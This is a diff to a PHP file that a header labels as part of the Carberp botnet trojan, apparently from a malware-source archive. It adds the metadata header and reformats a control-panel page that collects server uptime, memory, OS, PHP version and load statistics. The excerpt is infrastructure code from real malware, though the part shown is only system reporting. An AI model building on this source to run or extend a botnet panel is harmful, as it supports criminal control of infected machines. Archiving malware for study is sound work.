@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 get_function('size_format');
@@ -55,15 +66,20 @@ function time_math($s){
     return $return;
 }
 
-if(count($license['ip']) > 0){	$brainforce["ip"] = implode('<br />', array_keys($license['ip']));
+if(count($license['ip']) > 0){
+	$brainforce["ip"] = implode('<br />', array_keys($license['ip']));
 }else{
 	$brainforce["ip"] = $lang['no1'];
 }
 
-if(PHP_OS != 'WINNT'){	$uptime = @file_get_contents( "/proc/uptime" );
-	if(!empty($uptime)){		$brainforce["server_uptime"] = time_math(strtok($uptime, "."));
-	}elseif(@exec('cat /proc/uptime') != ''){		$brainforce["server_uptime"] = time_math(strtok(@exec('cat /proc/uptime'), "." ));
-	}else{		$brainforce["server_uptime"] = 'N/A';
+if(PHP_OS != 'WINNT'){
+	$uptime = @file_get_contents( "/proc/uptime" );
+	if(!empty($uptime)){
+		$brainforce["server_uptime"] = time_math(strtok($uptime, "."));
+	}elseif(@exec('cat /proc/uptime') != ''){
+		$brainforce["server_uptime"] = time_math(strtok(@exec('cat /proc/uptime'), "." ));
+	}else{
+		$brainforce["server_uptime"] = 'N/A';
 	}
 
 	ob_start();
@@ -71,12 +87,15 @@ if(PHP_OS != 'WINNT'){	$uptime = @file_get_contents( "/proc/uptime" );
 	$fmeminfo = ob_get_contents();
 	ob_end_clean();
 
-	if(empty($fmeminfo)){		$fmeminfo = @file_get_contents("/proc/meminfo");
+	if(empty($fmeminfo)){
+		$fmeminfo = @file_get_contents("/proc/meminfo");
 	}
 
-	if(!empty($fmeminfo)){		$data = explode("\n", $fmeminfo);
+	if(!empty($fmeminfo)){
+		$data = explode("\n", $fmeminfo);
 		$meminfo = array();
-		foreach ($data as $line) {			list($key, $val) = explode(":", $line);
+		foreach ($data as $line) {
+			list($key, $val) = explode(":", $line);
 			$meminfo[$key] = trim(str_replace('kB', '', $val));
 		}
 
@@ -92,18 +111,21 @@ if(PHP_OS != 'WINNT'){	$uptime = @file_get_contents( "/proc/uptime" );
     	$meminfo['SwapCached'] *= 1024;
     	$meminfo['SwapFreeAll'] = $meminfo['SwapFree'] + $meminfo['SwapCached'];
 		$brainforce["server_meminfo"] = $meminfo;
-	}else{		$brainforce["server_meminfo"] = false;
+	}else{
+		$brainforce["server_meminfo"] = false;
 	}
 
 	$brainforce["sys"] = json_decode(exec('sar | fgrep Average | awk \'{print "{\"user\":\""$3"\",\"system\":\""$5"\",\"iowait\":\""$6"\",\"idle\":\""$8"\"}"}\''), true);
 }
 
-if(@file_exists('/etc/redhat-release')){	$brainforce["os"] = @file_get_contents('/etc/redhat-release');
+if(@file_exists('/etc/redhat-release')){
+	$brainforce["os"] = @file_get_contents('/etc/redhat-release');
 }elseif(@file_exists('/etc/debian_version')){
 	$brainforce["os"] = 'Debian ' . @file_get_contents('/etc/debian_version') . ' (' . php_uname('m') . ')';
 }elseif(@file_exists('/etc/release')){
 	$brainforce["os"] = @file_get_contents('/etc/release');
-}else{	$brainforce["os"] = php_uname('s') . ' ' . php_uname('r') . ' (' . php_uname('m') . ')';
+}else{
+	$brainforce["os"] = php_uname('s') . ' ' . php_uname('r') . ' (' . php_uname('m') . ')';
 }
 
 $brainforce["webserver"] = $_SERVER["SERVER_SOFTWARE"];
@@ -114,7 +136,8 @@ if(version_compare(phpversion(), '5.3.3', '>=') == true){
 	$brainforce["phpversion"] = '<font color="red">'.phpversion().'</font>';
 }
 
-if(extension_loaded('Zend Optimizer') == True){	$brainforce["ZendOptimizer"] = zend_optimizer_version();
+if(extension_loaded('Zend Optimizer') == True){
+	$brainforce["ZendOptimizer"] = zend_optimizer_version();
 }elseif(extension_loaded('Zend Guard Loader') == True){
 	$brainforce["ZendOptimizer"] = 'Zend Guard Loader';
 }else{
@@ -163,7 +186,8 @@ $brainforce['mysql_all_size'] = size_format($brainforce['mysql_all_size']);
 
 if(function_exists('sys_getloadavg')){
 	$brainforce['sys_loadavg'] = sys_getloadavg();
-}else{	$brainforce['sys_loadavg']['0'] = '-';
+}else{
+	$brainforce['sys_loadavg']['0'] = '-';
 	$brainforce['sys_loadavg']['1'] = '-';
 	$brainforce['sys_loadavg']['2'] = '-';
 }
